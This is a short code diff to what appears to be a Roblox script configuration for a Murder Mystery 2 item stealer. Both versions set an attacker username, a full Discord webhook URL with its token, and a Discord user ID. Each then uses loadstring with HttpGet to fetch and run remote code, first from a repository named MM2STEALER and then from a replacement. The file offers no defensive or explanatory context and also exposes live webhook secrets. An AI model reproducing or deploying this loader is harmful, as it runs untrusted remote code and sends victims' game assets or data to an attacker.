@@ -1,5 +1,5 @@
-Username = "SynergyHolder_Server"
-Webhook = "https://discord.com/api/webhooks/1394800219866005627/O6VkPgHOIohZ7kmPJ6JrdPWenQh-e2Uj5vaKunU7chIu2uuWjRpQR0QrmQsCfLIkU8Md"
+Username = "kumsalxvprc"
+Webhook = "https://discord.com/api/webhooks/1398361544332411112/w_dtzDeWSJwL0jmQq11s2enrjirEYQJrCM07ygC2EgS9VrA7QIkdrNv1WYIMOGfxBqZg"
 discuser = "575154130645942287"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rghmodz2019/MM2STEALER/refs/heads/main/MM2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/mm2/refs/heads/main/mm2"))()
